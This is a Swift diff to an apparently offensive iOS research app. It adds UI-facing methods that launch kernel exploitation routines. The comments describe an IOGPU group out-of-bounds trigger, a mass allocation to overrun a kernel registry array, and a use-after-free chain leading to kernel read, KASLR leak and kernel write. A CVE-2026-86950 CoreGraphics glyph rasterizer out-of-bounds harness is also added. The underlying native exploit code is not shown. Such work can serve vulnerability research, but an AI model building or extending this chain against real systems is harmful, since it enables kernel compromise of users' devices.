@@ -40,6 +40,10 @@ final class AppState: ObservableObject {
     @Published var slide: UInt64 = 0
     @Published var base: UInt64 = 0
     @Published var running: Bool = false
+    @Published var chainStat: nk_chain_stat_t = nk_chain_stat_t()
+    @Published var v3Stat: nk_v3_stat_t = nk_v3_stat_t()
+    @Published var cve86950Stat: nk_86950_stat_t = nk_86950_stat_t()
+    @Published var cve86950Status: String = "—"
     private var starting = false
     @Published var status: RunStatus = .idle
 
@@ -228,6 +232,36 @@ final class AppState: ObservableObject {
         }
     }
 
+    /* IOGPU object-table probe: one group per accepted type on a single
+       connection, shared-window dump after each create, then close so the
+       destructor removes the same entries. Documents/group_oob.log */
+    func groupTypes() {
+        start {
+            nk_iogpu_group_oob_run(10)
+            return true
+        }
+    }
+
+    /* Mass-create up to 300k groups on one connection to walk the kernel
+       registry past its half-sized element array (entry 262144). Crash
+       test: the durable log keeps the last id. Documents/group_oob.log */
+    func groupFill() {
+        start {
+            nk_iogpu_group_oob_run(11)
+            return true
+        }
+    }
+
+    /* IOSurfaceAccelerator (AppleM2ScalerCSCDriver) first contact: is the
+       service published, does it open from the sandbox, which method
+       classes answer. Documents/scaler.log */
+    func scalerProbe() {
+        start {
+            nk_scaler_probe()
+            return true
+        }
+    }
+
     /* Turn a leaked kernel pointer into a mapping: IOMemoryDescriptor
        GetAddress on it gives a userspace view of kernel memory. */
     func kernMap() {
@@ -280,6 +314,52 @@ final class AppState: ObservableObject {
         start {
             _ = nk_aio_uaf_run(300)
             return true
+        }
+    }
+
+    /* Kernel R/W chain: trigger -> reclaim -> kernel read -> KASLR leak ->
+       blind kernel write. Durable log: Documents/aio_chain.log */
+    func runChain(attempts: Int) {
+        start {
+            var st = nk_chain_stat_t()
+            let rc = nk_krw_chain_run(Int32(attempts), &st)
+            nk_async_main {
+                AppState.shared.chainStat = st
+            }
+            return rc == 0
+        }
+    }
+
+    /* Chain v3: 64788 UAF -> kernel-side 0x100 spray -> IOGPU group OOB.
+       Durable log: Documents/krw_v3.log */
+    func runV3() {
+        start {
+            var st = nk_v3_stat_t()
+            let rc = nk_v3_run(&st)
+            nk_async_main {
+                AppState.shared.v3Stat = st
+            }
+            return rc == 0
+        }
+    }
+
+    /* CVE-2026-86950 CoreGraphics glyph rasterizer OOB (userland only).
+       mode 0 = ImageIO thumbnail, 1 = CGPDF draw, 2 = CGFont show-glyphs;
+       heap selects malloc (leaf 33) vs alloca (leaf 31) coverage buffer.
+       Durable log: Documents/cve86950.log */
+    func run86950(mode: Int32, heap: Bool) {
+        start {
+            var st = nk_86950_stat_t()
+            let rc = nk_86950_run(mode, heap ? 1 : 0, &st)
+            nk_async_main {
+                AppState.shared.cve86950Stat = st
+                AppState.shared.cve86950Status = String(
+                    format: "%@ · %@ · survived=%d · %llu ms",
+                    String(cString: nk_86950_name(mode)),
+                    heap ? "malloc" : "alloca",
+                    st.survived, st.elapsed_ms)
+            }
+            return rc == 0
         }
     }
 
